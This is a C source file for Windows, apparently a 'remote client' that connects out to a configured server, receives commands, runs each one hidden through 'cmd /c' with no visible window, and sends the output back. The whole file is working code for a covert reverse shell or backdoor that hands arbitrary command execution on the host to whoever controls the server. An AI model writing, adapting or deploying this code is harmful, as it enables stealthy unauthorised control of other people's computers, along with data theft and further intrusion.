#define _WIN32_WINNT 0x0600
#include <limits.h>
#include "remote_client.h"
#include <ws2tcpip.h>
#include <windows.h>
#include <ctype.h>

// Global variables
static SOCKET client_socket = INVALID_SOCKET;
static ClientConfig current_config;

// Custom IPv4 address parser
static int parse_ipv4(const char* src, struct in_addr* dst) {
    unsigned int b1, b2, b3, b4;
    char temp[4];
    int i = 0;
    
    // Read four numbers separated by dots
    if (sscanf(src, "%u.%u.%u.%u", &b1, &b2, &b3, &b4) != 4) {
        return 0;
    }
    
    // Validate ranges
    if (b1 > 255 || b2 > 255 || b3 > 255 || b4 > 255) {
        return 0;
    }
    
    // Convert to network byte order
    temp[0] = (char)b1;
    temp[1] = (char)b2;
    temp[2] = (char)b3;
    temp[3] = (char)b4;
    
    memcpy(dst, temp, sizeof(struct in_addr));
    return 1;
}

RemoteClientError initialize_client(const ClientConfig* config) {
    if (!config) {
        log_message(LOG_ERROR, "Initialize client: Invalid configuration");
        return RC_ERROR_SYSTEM;
    }

    // Initialize Winsock
    log_message(LOG_DEBUG, "Initializing Winsock 2.2");
    WSADATA wsa_data;
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        int error = WSAGetLastError();
        log_message(LOG_ERROR, "WSAStartup failed with error code: %d", error);
        return RC_ERROR_NETWORK;
    }
    
    log_message(LOG_DEBUG, "Winsock initialized successfully");

    // Store configuration
    current_config = *config;
    return RC_SUCCESS;
}

RemoteClientError connect_to_server(void) {
    struct sockaddr_in server_addr;
    
    // Create socket
    log_message(LOG_DEBUG, "Creating TCP socket");
    client_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (client_socket == INVALID_SOCKET) {
        int error = WSAGetLastError();
        log_message(LOG_ERROR, "Socket creation failed with error: %d", error);
        return RC_ERROR_NETWORK;
    }

    // Setup server address structure
    log_message(LOG_DEBUG, "Configuring server address: %s:%d", 
                current_config.server_address, current_config.server_port);
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(current_config.server_port);

    // Convert IP address string to binary
    if (parse_ipv4(current_config.server_address, &server_addr.sin_addr) != 1) {
        log_message(LOG_ERROR, "Invalid IP address format: %s", current_config.server_address);
        closesocket(client_socket);
        client_socket = INVALID_SOCKET;
        return RC_ERROR_NETWORK;
    }

    // Connect to server
    log_message(LOG_DEBUG, "Connecting to server...");
    if (connect(client_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        int error = WSAGetLastError();
        switch(error) {
            case WSAECONNREFUSED:
                log_message(LOG_ERROR, "Connection refused - No server listening on the specified address/port");
                break;
            case WSAENETUNREACH:
                log_message(LOG_ERROR, "Network is unreachable");
                break;
            case WSAETIMEDOUT:
                log_message(LOG_ERROR, "Connection attempt timed out");
                break;
            default:
                log_message(LOG_ERROR, "Connection failed with error: %d", error);
        }
        closesocket(client_socket);
        client_socket = INVALID_SOCKET;
        return RC_ERROR_NETWORK;
    }

    log_message(LOG_DEBUG, "Connection established");
    return RC_SUCCESS;
}

RemoteClientError disconnect_from_server(void) {
    if (client_socket != INVALID_SOCKET) {
        log_message(LOG_DEBUG, "Closing connection to server");
        closesocket(client_socket);
        client_socket = INVALID_SOCKET;
    } else {
        log_message(LOG_DEBUG, "No active connection to close");
    }
    return RC_SUCCESS;
}

RemoteClientError cleanup_client(void) {
    log_message(LOG_DEBUG, "Cleaning up client resources");
    disconnect_from_server();
    log_message(LOG_DEBUG, "Cleaning up Winsock");
    WSACleanup();
    return RC_SUCCESS;
}

RemoteClientError receive_message(Message* message) {
    if (!message || client_socket == INVALID_SOCKET) {
        log_message(LOG_ERROR, "Receive message: Invalid parameters or socket");
        return RC_ERROR_SYSTEM;
    }

    // Use size_t for all size-related variables
    size_t total_received = 0;
    int received;

    // Receive message type
    log_message(LOG_DEBUG, "Receiving message type");
    received = recv(client_socket, (char*)&message->type, sizeof(MessageType), 0);
    if (received != sizeof(MessageType)) {
        int error = WSAGetLastError();
        if (error == WSAECONNRESET || error == WSAECONNABORTED) {
            log_message(LOG_INFO, "Connection closed by server");
        } else {
            log_message(LOG_ERROR, "Failed to receive message type, error: %d", error);
        }
        return RC_ERROR_NETWORK;
    }

    // Receive data length
    log_message(LOG_DEBUG, "Receiving message length");
    received = recv(client_socket, (char*)&message->data_length, sizeof(size_t), 0);
    if (received != sizeof(size_t)) {
        log_message(LOG_ERROR, "Failed to receive message length");
        return RC_ERROR_NETWORK;
    }

    if (message->data_length > MAX_MESSAGE_SIZE) {
        log_message(LOG_ERROR, "Message too large: %zu bytes (max: %d)", 
                   message->data_length, MAX_MESSAGE_SIZE);
        return RC_ERROR_SYSTEM;
    }

    log_message(LOG_DEBUG, "Message header received: Type=%d, Length=%zu", 
                message->type, message->data_length);

    // Receive message data
    while (total_received < message->data_length) {
        size_t remaining = message->data_length - total_received;
        log_message(LOG_DEBUG, "Receiving message data: %zu/%zu bytes", 
                    total_received, message->data_length);
        
        received = recv(client_socket, 
                       message->data + total_received, 
                       (int)(remaining > INT_MAX ? INT_MAX : remaining),
                       0);
        if (received <= 0) {
            log_message(LOG_ERROR, "Error receiving message data");
            return RC_ERROR_NETWORK;
        }
        total_received += (size_t)received;
    }

    log_message(LOG_DEBUG, "Message received completely: %zu bytes", message->data_length);
    return RC_SUCCESS;
}

RemoteClientError send_message(const Message* message) {
    if (!message || client_socket == INVALID_SOCKET) {
        log_message(LOG_ERROR, "Send message: Invalid parameters or socket");
        return RC_ERROR_SYSTEM;
    }

    // Use size_t for all size-related variables
    size_t total_sent = 0;
    int sent;

    // Send message type
    log_message(LOG_DEBUG, "Sending message type: %d", message->type);
    sent = send(client_socket, (const char*)&message->type, sizeof(MessageType), 0);
    if (sent != sizeof(MessageType)) {
        log_message(LOG_ERROR, "Failed to send message type");
        return RC_ERROR_NETWORK;
    }

    // Send data length
    log_message(LOG_DEBUG, "Sending message length: %zu bytes", message->data_length);
    sent = send(client_socket, (const char*)&message->data_length, sizeof(size_t), 0);
    if (sent != sizeof(size_t)) {
        log_message(LOG_ERROR, "Failed to send message length");
        return RC_ERROR_NETWORK;
    }

    // Send message data
    while (total_sent < message->data_length) {
        size_t remaining = message->data_length - total_sent;
        log_message(LOG_DEBUG, "Sending message data: %zu/%zu bytes", 
                    total_sent, message->data_length);
        
        sent = send(client_socket, 
                   message->data + total_sent, 
                   (int)(remaining > INT_MAX ? INT_MAX : remaining),
                   0);
        if (sent <= 0) {
            log_message(LOG_ERROR, "Error sending message data");
            return RC_ERROR_NETWORK;
        }
        total_sent += (size_t)sent;
    }

    log_message(LOG_DEBUG, "Message sent completely: %zu bytes", message->data_length);
    return RC_SUCCESS;
}

RemoteClientError process_message(const Message* message) {
    if (!message) {
        log_message(LOG_ERROR, "Process message: Invalid message");
        return RC_ERROR_SYSTEM;
    }

    log_message(LOG_DEBUG, "Processing message of type %d", message->type);

    switch (message->type) {
        case MSG_TYPE_COMMAND: {
            log_message(LOG_INFO, "Executing command: %.*s", 
                       (int)message->data_length, message->data);
            
            // Create a null-terminated copy of the command
            char command[MAX_MESSAGE_SIZE + 1];
            strncpy(command, message->data, message->data_length);
            command[message->data_length] = '\0';

            // Create pipes for capturing output
            HANDLE hReadPipe, hWritePipe;
            SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
            if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
                Message error_msg = {
                    .type = MSG_TYPE_ERROR,
                    .data_length = strlen("Failed to create pipe")
                };
                strncpy(error_msg.data, "Failed to create pipe", error_msg.data_length);
                send_message(&error_msg);
                return RC_ERROR_SYSTEM;
            }

            // Setup process structures
            STARTUPINFO si;
            PROCESS_INFORMATION pi;
            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
            si.wShowWindow = SW_HIDE;  // Hide the window
            si.hStdOutput = hWritePipe;
            si.hStdError = hWritePipe;
            ZeroMemory(&pi, sizeof(pi));

            // Construct the complete command with cmd /c prefix
            char full_command[MAX_MESSAGE_SIZE + 8];
            snprintf(full_command, sizeof(full_command), "cmd /c %s", command);

            // Create the process
            if (!CreateProcessA(
                NULL,           // No module name (use command line)
                full_command,   // Command line
                NULL,           // Process handle not inheritable
                NULL,           // Thread handle not inheritable
                TRUE,          // Set handle inheritance to TRUE
                CREATE_NO_WINDOW, // Create with no window
                NULL,           // Use parent's environment block
                NULL,           // Use parent's starting directory 
                &si,           // Pointer to STARTUPINFO structure
                &pi)           // Pointer to PROCESS_INFORMATION structure
            ) {
                CloseHandle(hReadPipe);
                CloseHandle(hWritePipe);
                
                // Send error message back to server
                Message error_msg = {
                    .type = MSG_TYPE_ERROR,
                    .data_length = strlen("Command execution failed")
                };
                strncpy(error_msg.data, "Command execution failed", error_msg.data_length);
                send_message(&error_msg);
                return RC_ERROR_SYSTEM;
            }

            // Close write pipe (not needed in parent)
            CloseHandle(hWritePipe);

            // Read the output
            char output_buffer[MAX_MESSAGE_SIZE];
            DWORD bytes_read;
            size_t total_read = 0;
            Message response = { .type = MSG_TYPE_RESPONSE };

            while (ReadFile(hReadPipe, output_buffer + total_read, 
                          MAX_MESSAGE_SIZE - total_read, &bytes_read, NULL) 
                   && bytes_read > 0) {
                total_read += bytes_read;
                if (total_read >= MAX_MESSAGE_SIZE) break;
            }

            // Wait for command to complete
            WaitForSingleObject(pi.hProcess, INFINITE);

            // Close process and thread handles
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            CloseHandle(hReadPipe);

            // Send the output back to server
            response.data_length = total_read;
            memcpy(response.data, output_buffer, total_read);
            send_message(&response);
            break;
        }
            
        case MSG_TYPE_RESPONSE: {
            log_message(LOG_INFO, "Received response: %.*s", 
                       (int)message->data_length, message->data);
            break;
        }
            
        case MSG_TYPE_ERROR: {
            log_message(LOG_WARNING, "Received error: %.*s", 
                       (int)message->data_length, message->data);
            break;
        }
            
        default: {
            log_message(LOG_ERROR, "Unknown message type: %d", message->type);
            return RC_ERROR_SYSTEM;
        }
    }

    return RC_SUCCESS;
}